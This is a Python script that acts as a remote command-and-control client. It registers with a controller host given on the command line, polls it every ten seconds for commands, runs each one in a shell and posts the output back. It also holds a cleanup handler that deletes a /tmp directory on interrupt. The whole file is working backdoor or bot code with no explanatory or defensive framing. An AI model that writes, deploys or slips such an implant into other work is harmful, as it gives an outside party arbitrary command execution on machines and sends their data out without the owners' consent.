#!`which python`


import subprocess
import requests
import signal
import time
import json
import sys
import os

session=requests.session()


def self_destruct(signum, frame):
    os.system('rm -rf /tmp/lolz')
    exit(0)

signal.signal(signal.SIGINT, self_destruct)

CLIENTNAME="`hostname`"
UNAME="`uname -a`"
HOST=sys.argv[1]
CLIENTID, KEY=json.loads(session.post('http://' + HOST + '/client/register',data={
    'clientname':CLIENTNAME,
    'uname':UNAME,
}).text)

def do_cmd(cmd):
    return subprocess.check_output(cmd,shell=True).decode().strip()


while True:
    control=json.loads(session.post('http://'+HOST+'/client/get_pending', data={
        'clientname':CLIENTNAME,
        'uname':UNAME,
        'clientid':CLIENTID,
    }).text)

    response={
        'clientid': CLIENTID,
        'report': {
            commandid: do_cmd(command)
            for commandid, command in control
        }
    }

    if len(response) > 0:
        session.post(
            'http://'+HOST+'/client/submit_pending',
            data=json.dumps(response),
            headers={'content-type':'application/json'}
        )
    
    time.sleep(10)
    

